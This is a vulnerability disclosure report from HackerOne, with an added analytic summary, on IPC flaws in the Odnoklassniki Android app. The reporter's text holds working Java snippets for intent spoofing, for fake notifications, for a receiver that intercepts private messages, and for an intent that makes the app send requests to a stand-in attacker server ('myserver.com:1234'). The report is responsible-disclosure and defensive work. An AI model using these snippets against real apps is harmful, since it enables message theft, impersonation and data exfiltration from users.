# Multiple Critical Vulnerabilities in Odnoklassniki Android Application (Intent Spoofing, Broadcast Interception, Privilege Redelegation)

## Metadata
- **Source:** HackerOne
- **Report:** 97295 | https://hackerone.com/reports/97295
- **Submitted:** 2015-11-02
- **Reporter:** hardc0re
- **Program:** Odnoklassniki
- **Bounty:** Not specified in writeup
- **Severity:** Critical
- **Vuln:** Intent Spoofing, Broadcast Receiver Hijacking, Unauthorized Intent Receipt, Privilege Redelegation, Insecure IPC, Missing Permission Enforcement
- **CVEs:** None
- **Category:** uncategorised

## Summary
The Odnoklassniki Android application contains multiple critical IPC vulnerabilities including intent spoofing via exported activities, unprotected broadcast receivers that can be hijacked to spoof notifications or intercept private messages, and privilege redelegation allowing third-party apps to leverage the app's INTERNET permission. These vulnerabilities allow attackers to perform unauthorized actions, intercept sensitive user data, and circumvent Android's permission system.

## Attack scenario
1. Attacker creates malicious app and targets VideoUploadActivity via explicit intent using setClassName to trigger unintended video upload functionality
2. Malicious app sends crafted broadcast intents to ru.ok.android.action.NOTIFY action with fake message payloads to spoof notifications to victim
3. Victim receives fake private message notification appearing to be from legitimate Odnoklassniki contacts, leading to social engineering
4. Attacker registers BroadcastReceiver for ru.ok.android.action.NOTIFY in malicious app to intercept all legitimate notifications including private messages and sensitive user IDs
5. Attacker exploits VideochatController.java to leverage Odnoklassniki's INTERNET permission to make unauthorized HTTP requests on behalf of the app
6. Attacker chains vulnerabilities to perform privilege escalation, gain network access, and exfiltrate user data without proper permissions

## Root cause
Multiple configuration and design flaws: (1) Activities/BroadcastReceivers explicitly exported without android:exported=false or permission requirements, (2) Implicit intents used for inter-app communication without permission protection, (3) Public broadcast actions receivable by any app without signature verification, (4) Improper permission delegation allowing third-party code to leverage sensitive permissions like INTERNET

## Attacker mindset
Opportunistic attacker seeking to abuse legitimate app's permissions and trusted status. Motivated by social engineering (fake notifications), data theft (message interception), unauthorized uploads, and privilege escalation through permission reuse. Recognizes app's trusted position and leverages IPC mechanisms as attack surface.

## Defensive takeaways
- Explicitly set android:exported="false" on all components not intended for external use
- Use explicit intents with setClassName/setComponent for internal app communication instead of implicit intents
- Protect broadcast receivers with custom permissions that require signature-level verification
- Implement permission checks in BroadcastReceiver.onReceive() to validate caller identity
- Use LocalBroadcastManager or androidx.localbroadcastmanager for internal broadcasts
- Avoid exposing Activities that handle sensitive operations without authentication checks
- Never allow third-party code execution with elevated permissions; validate all external input
- Implement intent signature validation before processing sensitive intents
- Use permission protection levels appropriately (signature/signatureOrSystem for sensitive intents)
- Conduct regular IPC security audits on AndroidManifest.xml and component exports

## Variant hunting
Search for other Android apps with: exported Activities without permission enforcement, unprotected BroadcastReceivers using implicit intents, permission delegation to WebView or external libraries, exposed Services without permission checks, exported ContentProviders without URI permission restrictions, implicit intent filters with sensitive actions, use of startActivityForResult() with user-controlled input

## MITRE ATT&CK
- T1045
- T1129
- T1204
- T1557
- T1040
- T1020

## Notes
Writeup demonstrates sophisticated understanding of Android IPC attack surface. Reporter provided working exploit code for each vulnerability class. Privilege redelegation (using app as permission proxy) is particularly severe as it violates Android's fundamental security model. These vulnerabilities likely affected millions of users in Russia/Eastern Europe where Odnoklassniki is popular. The report exemplifies how legitimate apps can be weaponized through improper component export configuration.

## Full report
<details><summary>Expand</summary>

Hello,

I have recently found several critical vulnerabilities in Odnoklassniki Android application, which is one of your projects, thus I am reporting it here.

The first vulnerability is so called Intent spoofing.
The vulnerability lies in ability to start the video upload activity of Odnoklassniki application from inside a different application installed on the same device. This vulnerability happens when a component is made public and requires no special permission. A consequence of this may be that a malicious app sends an intent to a legitimate component (VideoUploadActivity), which will result in data injection or state change (in our case a user might be tricked into uploading content he normally would not upload to ok.ru network).

The following code snippet demonstrates possible exploit code:

Intent m = new Intent();
m.setClassName("ru.ok.android","ru.ok.android.ui.activity.StartVideoUploadActivity");
startActivity(m);

Staying with the intent spoofing vulnerability, there is one more case of this kind of vulnerability.
This time a malicious application is able to send fake Notifications to user about literally any happening or action in Odnoklassniki. User can be tricked this way to do action he did not intend to again. A malicious app might send fake private messages to the victim user, impersonating other users! The user can be misinformed about a comment on his photo or a response in any of groups he belongs to! The origin of this vulnerability is just as the former one, action is made public in the application and it does not require the calling application to have any kind of permission to do so.
This vulnerability originates from class ok.ru.android.services.app.NotifyReceiver

Possible fix to this? Explicitly set the value of android:exported to false or make use of permissions.

A short code snippet demonstrating possible exploitation:

Intent u = new Intent();
u.setAction("ru.ok.android.action.NOTIFY");
u.putExtra("key", "d-147298617");
u.putExtra("message", "Hello there! This is a fake message. You have been tricked.");

//u.putExtra("conversation_id", "");
//u.putExtra("mediatopic_id", "413434225584");

u.putExtra("dsc_id", "612470493988:USER_PHOTO");

getActivity().sendBroadcast(u);

Another vulnerability that I have found is Unauthorized intent receipt, in this certain case it is unauthorized notification (message) receipt. Knowing this vulnerability a potential attacking application is able to intercept private messages, updates, photo comments, post comments, etc. sent to the user. The cause of this vulnerability lies in AndroidManifest.xml. The receipt of a notification (message) should be protected from intercepting with proper permission requirement. Possible mitigation - Do not use implicit intents for communication between the components of a single app or require the target application to have a proper permission acquired.

Here I am enclosing a complete malicious receiver code snippet, which is able to intercept all "messages" shown to the user as a notification. Please note, that the malicious application is able to see not only the message but the userId of the user who sent it and many other sensitive details.

public class MaliciousReceiver extends BroadcastReceiver {
@Override
public void onReceive(Context context, Intent intent) {
    if ("ru.ok.android.action.NOTIFY".equals(intent.getAction())) {

        Bundle localBundle = intent.getExtras();
        if (localBundle != null) {
            String str1 = localBundle.getString("key");
            String str2 = localBundle.getString("message");
            String str3 = localBundle.getString("cid");
            if (str3 != null) {
                String str4 = localBundle.getString("caller_name");
                String str5 = localBundle.getString("server");
                return;
            }

            String str4 = localBundle.getString("nconversation_id");
            String str5 = localBundle.getString("dsc_id");

            Toast.makeText(context, "key:" + str1 + "\nmessage: " + str2 + "\ncid: " + str3 + "\nconversation_id: " + str4 + "\ndsc_id: " + str5, Toast.LENGTH_SHORT).show();
        }
    }
}

}

And here comes the most serious issue. The vulnerabilities explained above affected the data and user privacy in scope of your application "only". This vulnerability, on the other side, violates the whole android security mechanism. The vulnerability is known as "Privilege redelegation". It happens when your application is used as a mediator to help other (malicious) applications to circumvent android permission system.
This vulnerability lies in class ru.ok.android.videochat.VideochatController.java .
The permission which is mediated to 3rd party applications here is the INTERNET persmission, which is truly the most dangerous permission out there.
When we analyze the following line of code:

localHttpMethod = new RestApiMethodBuilder(localServiceStateHolder, HttpMethodType.GET).setTargetUrl(new URI("http://" + this.server + "/", false)).addRelativePath("api-get-signal", true).addSignedParam("uid", localServiceStateHolder.getUserId(), false).addSignedParam("cid", str1, false).addSignedParam("client", Constants.Api.CLIENT_NAME, false).build();

we can clearly notice that there's a variable (this.server) passed directly to the method construction.
As you can imagine, I am able to pass the address of my own server to this variable through an Intent.
This will result in Odnoklassniki application sending an HTTP request to my server with all the data contained!
We cannot alter the data contained within the request, but that does not stop us.
Once any 3rd party application is able to send a HTTP request to arbitrary server in the world just with a single Intent, without even the need to have the INTERNET permission acquired itself, it obviously violates the android security permission principle.

The code demonstration would require longer piece of code, thus I will try to explain possible exploit scenario verbally.
As we can perform a single HTTP request with a single Intent sent to ok.ru application, we can do this more times in row without an issue! Data does not need to be transfered from the device using a text, we could use a morse code for example. We could send the Intents within specific time intervals and delays, which would reflect in arbitrary information being leaked from the device to an arbitrary server. The morse code processing in our means would be processed at the server side of course.

The mediated HTTP request from a 3rd party application may be achieved using a code like this:

Intent m = new Intent();
m.setAction("ru.ok.android.action.NOTIFY");
m.putExtra("key", "vchat");
m.putExtra("cid", "c60b0e06695a4ce896261247b43f772b");
m.putExtra("caller_name", "Fake User");
m.putExtra("server", "myserver.com:1234");
getActivity().sendBroadcast(m);

I hope I have explained each of the vulnerabilities clearly enough so that you can patch them with ease.
If something is not clear enough, please feel free to ask more details. I can provide some PoC with pictures in case of need too.

I am also enclosing a PoC of the privilege redelegation vulnerability.
In the picture there is the HTTP request that is sent by my demo malicious (exploit) application through the ok.ru application to my server.

I am looking forward to hearing from you soon.

Kind regards,
Jan Hodermarsky


</details>

---
*Analysed by Claude on 2026-05-24*
